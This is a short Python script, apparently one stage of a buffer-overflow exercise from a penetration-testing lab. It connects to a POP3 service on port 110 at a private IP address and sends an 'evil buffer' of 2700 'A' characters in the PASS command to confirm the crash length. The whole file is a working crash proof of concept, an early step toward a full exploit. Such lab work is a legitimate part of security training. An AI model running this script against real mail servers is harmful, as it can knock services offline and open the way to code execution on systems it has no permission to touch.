# PART 2: Crash replication script
#
# We want to confirm again that it takes roughly X bytes to crash the program

import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

string = "A" * 2700

try:
	print("Sending evil buffer...")
	connect = s.connect(('10.11.22.75', 110))
	data = s.recv(1024)
	s.send("USER username" + "\r\n")
	data = s.recv(1024)
	s.send("PASS {}".format(string) + "\r\n")
	s.close()
	print("\nDone")
except Exception as e:
	print(e)
